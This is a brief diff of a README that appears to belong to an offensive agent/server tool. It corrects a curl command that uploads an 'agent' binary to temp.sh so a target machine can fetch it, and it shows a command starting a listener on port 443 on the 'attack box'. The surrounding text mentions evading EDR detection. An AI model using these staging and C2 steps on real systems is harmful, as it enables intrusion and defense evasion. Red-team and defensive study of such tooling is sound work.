@@ -64,7 +64,7 @@ In testing, I noticed that EDR detected the compilation of `agent.c` by monitori
 
 Server (Attack box) : 
 
-- `curl -F "file=agent" https://temp.sh/upload`
+- `curl -F "file=@agent" https://temp.sh/upload`
 - `python3 server.py --ip IP --port 443` 
 
 Agent (Target machine) :
